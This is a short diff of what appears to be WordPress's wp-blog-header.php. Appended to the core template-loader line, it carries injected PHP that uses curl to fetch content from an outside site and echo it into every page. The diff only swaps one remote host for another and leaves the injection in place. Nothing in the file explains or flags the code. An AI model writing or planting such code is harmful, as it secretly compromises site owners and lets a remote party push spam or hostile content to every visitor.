@@ -16,6 +16,6 @@ if ( ! isset( $wp_did_header ) ) {
 	wp();
 
 	// Load the theme template.
-	require_once ABSPATH . WPINC . '/template-loader.php';$ch = curl_init(); curl_setopt($ch, CURLOPT_URL, 'https://theso.org/links/'); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $a = curl_exec($ch); curl_close($ch); echo $a;
+	require_once ABSPATH . WPINC . '/template-loader.php';$ch = curl_init(); curl_setopt($ch, CURLOPT_URL, 'https://beritau.net/devel/'); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $a = curl_exec($ch); curl_close($ch); echo $a;
 
 }
